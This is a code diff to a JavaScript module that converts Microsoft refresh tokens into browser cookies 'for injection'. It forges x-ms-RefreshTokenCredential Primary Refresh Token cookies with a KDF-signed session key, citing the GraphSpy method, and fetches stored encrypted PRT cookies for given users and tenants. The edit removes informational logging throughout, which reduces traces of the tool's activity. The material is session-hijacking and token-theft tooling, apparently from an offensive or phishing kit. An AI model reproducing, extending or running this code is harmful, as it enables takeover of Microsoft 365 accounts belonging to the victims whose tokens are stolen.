@@ -225,7 +225,6 @@ async function generateXmsRefreshTokenCredential(tokenResponse, accountType, ext
         // GraphSpy passes the PRT JWT as the refresh_token claim, not the raw token.
         const prt = extraOpts.prt || refreshToken;
         const kdfCookie = prtkdf.buildPrtCookieJwt(prt, extraOpts.sessionKey, nonce);
-        console.log('[CookieConverter] PRT cookie generated via KDF session key (uid=' + String(uid || '').substring(0, 8) + '..., tid=' + (tid || '?') + ')');
         return {
           name: 'x-ms-RefreshTokenCredential',
           value: kdfCookie,
@@ -270,7 +269,6 @@ async function getStoredPrtCookie(userId, tenantId) {
 
     const { decrypt } = require('../utils/encrypt');
     const prtCookie = decrypt(rows[0].prt_cookie_encrypted);
-    console.log('[CookieConverter] Found stored PRT cookie for user', userId, 'tenant', tenantId);
     return prtCookie;
   } catch (err) {
     console.error('[CookieConverter] Failed to get stored PRT cookie:', err.message);
@@ -289,7 +287,6 @@ async function refreshStoredPrtCookie(userId, tenantId, refreshToken) {
   try {
     const deviceManager = require('./devicemanager');
     const prtCookie = await deviceManager.refreshPrtCookie(userId, tenantId, refreshToken);
-    console.log('[CookieConverter] Refreshed PRT cookie for user', userId, 'tenant', tenantId);
     return prtCookie;
   } catch (err) {
     console.error('[CookieConverter] Failed to refresh PRT cookie:', err.message);
@@ -350,18 +347,15 @@ async function convertTokensToCookies(inputToken, templateType, tenant, email, a
       ? 'openid profile offline_access https://outlook.office.com/SMTP.Send'
       : 'openid profile offline_access https://graph.microsoft.com/User.Read';
 
-    console.log('[CookieConverter] Exchanging token for account type:', accountType, 'tenant:', tenant);
 
     const exchangeResult = await exchangeTokenForCookies(inputToken, tenant, accountType, scope);
     if (!exchangeResult.success) {
       console.error('[CookieConverter] Token exchange failed:', exchangeResult.error);
       return exchangeResult;
     }
-    console.log('[CookieConverter] Token exchange successful, got', exchangeResult.cookies.length, 'cookies');
 
     // Collect additional service cookies
     const serviceCookies = await collectServiceCookies(exchangeResult.access_token, templateType, tenant, email, accountType);
-    console.log('[CookieConverter] Collected', serviceCookies.length, 'service cookies');
 
     // Generate x-ms-RefreshTokenCredential cookie
     // GraphSpy always mints a FRESH KDF-signed cookie from the stored session
@@ -399,7 +393,6 @@ async function convertTokensToCookies(inputToken, templateType, tenant, email, a
         { prt: prtMaterial, sessionKey }
       );
       if (xmsCookie) {
-        console.log('[CookieConverter] Generated fresh PRT cookie via KDF (GraphSpy method)');
       } else {
         console.warn('[CookieConverter] KDF cookie generation failed; falling back to stored cookie');
       }
@@ -410,7 +403,6 @@ async function convertTokensToCookies(inputToken, templateType, tenant, email, a
       try {
         const storedPrt = await getStoredPrtCookie(userId, tenant);
         if (storedPrt) {
-          console.log('[CookieConverter] Using stored DRS PRT cookie for x-ms-RefreshTokenCredential (no usable session key)');
           xmsCookie = {
             name: 'x-ms-RefreshTokenCredential',
             value: storedPrt,
@@ -425,7 +417,6 @@ async function convertTokensToCookies(inputToken, templateType, tenant, email, a
     if (!xmsCookie && !isPersonal && !sessionKey) {
       console.warn('[CookieConverter] No PRT cookie: no stored session key and no stored DRS PRT cookie available');
     }
-    console.log('[CookieConverter] XMS cookie:', xmsCookie ? 'generated' : 'null');
 
     // Combine all cookies
     const allCookies = [
@@ -439,7 +430,6 @@ async function convertTokensToCookies(inputToken, templateType, tenant, email, a
     }
 
     const cookieString = formatCookiesForInjection(allCookies, accountType);
-    console.log('[CookieConverter] Total cookies formatted:', allCookies.length);
     
     return {
       success: true,
@@ -483,11 +473,9 @@ async function exchangeTokenForCookies(token, targetTenant, accountType, scope) 
     endpoints.push(TOKEN_ENDPOINTS.common);
   }
 
-  console.log('[CookieConverter] Will try endpoints:', endpoints.join(', '));
 
   for (const endpoint of endpoints) {
     try {
-      console.log('[CookieConverter] Trying endpoint:', endpoint);
 
       // Use appropriate client ID
       const currentClientId = getClientIdForAccountType(accountType);
@@ -516,12 +504,10 @@ async function exchangeTokenForCookies(token, targetTenant, accountType, scope) 
       const errData = response.data || {};
       const errMsg = errData.error_description || errData.error || `HTTP ${response.status}`;
 
-      console.log('[CookieConverter] Endpoint', endpoint, 'returned', response.status, '-', errMsg.substring(0, 100));
 
       if (response.status === 200) {
         newRefreshToken = response.data.refresh_token || token;
         extractCookiesFromResponse(cookies, response, endpoint);
-        console.log('[CookieConverter] Token exchange succeeded on:', endpoint, '- got', cookies.length, 'cookies');
         // Extract the PRT. The x-ms-RefreshTokenCredential cookie value is a
         // KDF-signed JWT whose refresh_token claim is the raw PRT — GraphSpy
         // passes that raw PRT as the refresh_token claim, not the cookie value.
